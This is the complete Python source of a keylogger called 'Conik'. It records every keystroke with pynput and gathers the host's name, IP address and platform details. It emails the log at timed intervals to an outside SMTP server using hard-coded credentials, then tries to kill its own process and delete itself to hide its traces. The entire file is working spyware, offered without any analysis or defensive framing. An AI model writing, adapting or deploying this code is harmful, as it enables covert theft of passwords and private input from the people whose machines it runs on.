import os
import platform
import smtplib
import socket
import threading
from pynput import keyboard

email = "6623b820806b3f"
email_pass = "e7981cd7a24bee"
send_delay = 80

class Conik:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "Conik starting in several seconds..."
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log = self.log + string

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = "  " + str(key) + "  "
        self.appendlog(current_key)

    def send_mail(self, email, password, message):
        sender = "Z0mb13"
        receiver = "Th3f1x"

        m = f"""\
        Subject: Conik log
        To: {receiver}
        From: {sender}
        Conik by Th3f1x\n"""
        m += message
        with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
            server.login(email, password)
            server.sendmail(sender,receiver,message)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_info(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(hostname)
        self.appendlog(ip)
        self.appendlog(plat)
        self.appendlog(system)
        self.appendlog(machine)

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        if os.name == "nt":
            #OS based in windows
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print('conik is closed')
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print('conik is closed')
        else:
            #OS based in Linux
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system('pkill leafpad')
                os.system("chattr -i " +  os.path.basename(__file__))
                print('conik closed')
                os.system("rm -rf" + os.path.basename(__file__))
            except OSError:
                print('conik is closed')

Conik = Conik(send_delay,email,email_pass)

Conik.run()


